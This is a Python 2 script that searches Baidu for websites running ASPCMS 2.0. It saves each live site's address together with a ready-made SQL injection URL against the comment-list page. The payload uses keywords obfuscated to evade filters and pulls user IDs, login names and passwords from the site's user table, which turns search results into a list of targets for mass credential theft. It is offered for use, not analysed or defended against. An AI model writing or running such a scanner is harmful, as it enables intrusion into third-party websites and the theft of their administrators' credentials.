# -*- coding: UTF-8 -*-
import requests
import re
from bs4 import BeautifulSoup as bs
import thread
import time
def main():
    for i in range(100,200,10):
        expp=("/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user")
        url='https://www.baidu.com/s?wd=--Powered by ASPCMS 2.0&pn=%s'%(str(i))
        headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'}
        r=requests.get(url=url,headers=headers)
        soup=bs(r.content,'html.parser')
        urls=soup.find_all(name='a',attrs={'data-click':re.compile(('.')),'class':None})
        for url in urls:
            try:
                r_get_url = requests.get(url=url['href'], headers=headers, timeout=4)
                if r_get_url.status_code == 200:
                    url_para = r_get_url.url
                    url_index_tmp = url_para.split('/')
                    url_index = url_index_tmp[0] + '//' + url_index_tmp[2]
                    with open('cs.txt') as f:
                        if url_index not in f.read():  # 这里是一个去重的判断，判断网址是否已经在文本中，如果不存在则打开txt并写入我们拼接的exp链接。
                            print url_index
                            f2 = open("cs.txt", 'a+')
                            f2.write(url_index + expp + '\n')
                            f2.close()
            except:
                continue
if __name__ == '__main__':
    f2=open('cs.txt','w')
    f2.close()
    main()
